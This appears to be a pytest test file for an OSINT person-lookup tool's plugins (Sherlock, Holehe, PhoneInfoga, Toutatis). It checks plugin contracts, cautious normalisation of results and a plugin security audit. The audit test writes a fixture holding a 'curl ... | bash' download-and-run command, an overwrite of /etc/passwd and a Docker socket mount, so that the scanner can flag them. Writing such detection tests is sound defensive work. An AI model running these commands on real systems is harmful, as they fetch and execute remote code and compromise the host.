"""The plugin contract, output normalisation and the security audit."""
from __future__ import annotations

from pathlib import Path

import pytest

from app.plugins import audit, registry
from app.plugins.base import NormalizedItem, OSINTPlugin, RawResult, Target
from app.plugins.holehe.plugin import HolehePlugin
from app.plugins.phoneinfoga.plugin import PhoneInfogaPlugin
from app.plugins.sherlock.plugin import SherlockPlugin
from app.plugins.toutatis.plugin import ToutatisPlugin
from app.plugins.websearch.plugin import WebSearchPlugin, build_queries


def test_all_plugins_are_discovered() -> None:
    names = set(registry.discover(force=True))
    assert {"sherlock", "holehe", "phoneinfoga", "toutatis", "websearch"} <= names


def test_every_plugin_declares_its_contract() -> None:
    for plugin in registry.all_plugins():
        assert isinstance(plugin, OSINTPlugin)
        assert plugin.name and plugin.version
        assert plugin.supported_identifiers, f"{plugin.name} supports no identifier"
        assert plugin.queue, f"{plugin.name} has no dedicated queue"
        assert (Path(__file__).parents[1] / "app" / "plugins" / plugin.name / "manifest.json").exists()


def test_toutatis_is_optional_and_disabled_by_default() -> None:
    plugin = ToutatisPlugin()
    assert plugin.enabled_by_default is False
    assert plugin.requires_secrets == ["sessionid"]
    # No secret may be named "password": project policy.
    assert not any("password" in key.lower() for key in plugin.requires_secrets)
    assert plugin.risk_notes


def test_toutatis_refuses_to_run_without_session() -> None:
    plugin = ToutatisPlugin()
    target = Target(type="USERNAME", value="jdupont", context={"secrets": {}})
    from app.core.config import settings

    original = settings.toutatis_enabled
    settings.toutatis_enabled = True
    try:
        raw = plugin.execute(target)
    finally:
        settings.toutatis_enabled = original
    assert raw.error and "sessionid" in raw.error


def test_sherlock_results_are_presence_not_identity() -> None:
    plugin = SherlockPlugin()
    raw = RawResult(
        items=[
            {"platform": "GitHub", "url": "https://github.com/jdupont", "username": "jdupont"},
            {"platform": "Instagram", "url": "https://instagram.com/jdupont", "username": "jdupont"},
        ]
    )
    target = Target(type="USERNAME", value="jdupont")
    items = plugin.validate(plugin.normalize(raw, target), target)

    assert len(items) == 2
    for item in items:
        assert item.confidence <= 0.40, "Sherlock alone cannot be highly confident"
        assert item.payload["identity_proven"] is False
        assert item.payload["verification_status"] == "HYPOTHESIS"
        assert item.source.url
        assert item.warnings


def test_sherlock_stdout_parser() -> None:
    plugin = SherlockPlugin()
    stdout = (
        "[*] Checking username jdupont on:\n"
        "[+] GitHub: https://github.com/jdupont\n"
        "[+] Reddit: https://reddit.com/user/jdupont\n"
    )
    parsed = plugin._parse_stdout(stdout)
    assert parsed == [
        {"platform": "GitHub", "url": "https://github.com/jdupont"},
        {"platform": "Reddit", "url": "https://reddit.com/user/jdupont"},
    ]


def test_holehe_ratelimited_is_not_a_negative() -> None:
    plugin = HolehePlugin()
    raw = RawResult(
        items=[
            {"name": "instagram", "domain": "instagram.com", "exists": True, "rateLimit": False},
            {"name": "spotify", "domain": "spotify.com", "exists": False, "rateLimit": True},
            {"name": "pinterest", "domain": "pinterest.com", "exists": False, "rateLimit": False},
        ]
    )
    target = Target(type="EMAIL", value="jean@exemple.fr")
    items = plugin.normalize(raw, target)
    kinds = {item.payload.get("service"): item.payload.get("result") for item in items}

    assert kinds["instagram"] == "used"
    assert kinds["spotify"] == "inconclusive"
    assert "pinterest" not in kinds  # confirmed absence: nothing stored


def test_holehe_obfuscated_values_stay_uncertain() -> None:
    plugin = HolehePlugin()
    raw = RawResult(
        items=[
            {
                "name": "twitter",
                "domain": "twitter.com",
                "exists": True,
                "emailrecovery": "j***@g***.com",
                "phoneNumber": "+33******78",
            }
        ]
    )
    items = plugin.normalize(raw, Target(type="EMAIL", value="jean@exemple.fr"))
    obfuscated = [i for i in items if i.kind == "obfuscated_contact"]

    assert len(obfuscated) == 2
    for item in obfuscated:
        assert item.payload["certain"] is False
        assert item.confidence <= 0.5
        assert item.warnings


def test_phoneinfoga_local_mode_generates_queries_without_calling_anything() -> None:
    plugin = PhoneInfogaPlugin()
    raw = plugin.execute(Target(type="PHONE", value="+33612345678"))

    assert raw.error is None
    assert raw.meta["mode"] in {"local", "rest", "cli"}
    dorks = [i for i in raw.items if i["kind"] == "dorks"][0]["data"]
    assert dorks and all(d["url"].startswith("https://") for d in dorks)

    items = plugin.normalize(raw, Target(type="PHONE", value="+33612345678"))
    queries = [i for i in items if i.kind == "search_query"]
    assert queries and all(i.payload["executed"] is False for i in queries)

    info = [i for i in items if i.kind == "phone_info"][0]
    assert info.payload["country"] == "FR"
    assert info.payload["formats"]["e164"] == "+33612345678"


def test_websearch_builds_targeted_queries() -> None:
    queries = build_queries("USERNAME", "jdupont")
    joined = " ".join(q["query"] for q in queries)
    assert "site:github.com" in joined
    assert "site:instagram.com" in joined
    assert all(q["url"].startswith("https://") for q in queries)

    email_queries = build_queries("EMAIL", "jean@exemple.fr")
    assert any('"jean"' == q["query"] for q in email_queries)


def test_websearch_without_provider_executes_nothing() -> None:
    from app.core.config import settings

    assert settings.search_provider == "none"
    plugin = WebSearchPlugin()
    raw = plugin.execute(Target(type="USERNAME", value="jdupont"))
    assert raw.meta["provider"] == "none"
    assert all(item["kind"] == "queries" for item in raw.items)


def test_plugin_audit_flags_dangerous_patterns(tmp_path: Path) -> None:
    (tmp_path / "manifest.json").write_text('{"repository": "x", "license": "MIT"}', encoding="utf-8")
    (tmp_path / "evil.py").write_text(
        "import subprocess\n"
        "subprocess.run('curl http://x.tld/a.sh | bash', shell=True)\n"
        "open('/etc/passwd','w')\n",
        encoding="utf-8",
    )
    (tmp_path / "docker-compose.yml").write_text(
        "services:\n  x:\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n",
        encoding="utf-8",
    )

    report = audit.audit_path(tmp_path, "evil")
    codes = {signal.code for signal in report.signals}

    assert report.risk_level == "CRITICAL"
    assert {"shell_true", "curl_pipe_shell", "docker_socket"} <= codes
    assert report.summary()["docker_socket"] == "YES"


def test_audit_of_shipped_plugins_stays_low_or_medium() -> None:
    for report in audit.audit_all():
        assert report.risk_level in {"LOW", "MEDIUM"}, (
            f"{report.plugin}: {report.risk_level} - "
            f"{[s.code for s in report.signals if s.severity in {'HIGH', 'CRITICAL'}]}"
        )
        assert report.manifest, f"{report.plugin} has no manifest"


def test_audit_report_never_promises_safety() -> None:
    report = audit.audit_plugin("sherlock")
    assert "guarantee" in report.summary()["disclaimer"].lower()


def test_normalized_item_roundtrip() -> None:
    item = NormalizedItem(
        kind="social_profile",
        title="t",
        payload={"a": 1},
        source=__import__("app.plugins.base", fromlist=["SourceRef"]).SourceRef(url="https://x"),
    )
    data = item.as_dict()
    assert data["source"]["url"] == "https://x"
    assert data["kind"] == "social_profile"


@pytest.mark.parametrize("plugin_name", ["sherlock", "holehe", "phoneinfoga", "toutatis", "websearch"])
def test_health_check_never_raises(plugin_name: str) -> None:
    """A health probe must always answer, even when the tool is missing."""
    plugin = registry.get(plugin_name)
    status = plugin.check_health()
    assert isinstance(status.ok, bool)
    assert status.message


def test_seeding_platforms_twice_is_idempotent(db) -> None:
    """Regression: the second run used to crash because the table was no longer
    empty, which broke `osint db init` and `osint setup` on an existing install."""
    from app.services.platforms import PLATFORM_SEED, seed_platforms

    first = seed_platforms(db)
    second = seed_platforms(db)

    assert second == 0, "a second seeding must insert nothing"
    assert first + second <= len(PLATFORM_SEED)


def test_no_plugin_is_enabled_implicitly() -> None:
    """A fresh registry must switch nothing on: activation is always explicit."""
    for plugin in registry.all_plugins():
        assert plugin.enabled_by_default is False, (
            f"{plugin.name} would be enabled without an explicit decision"
        )
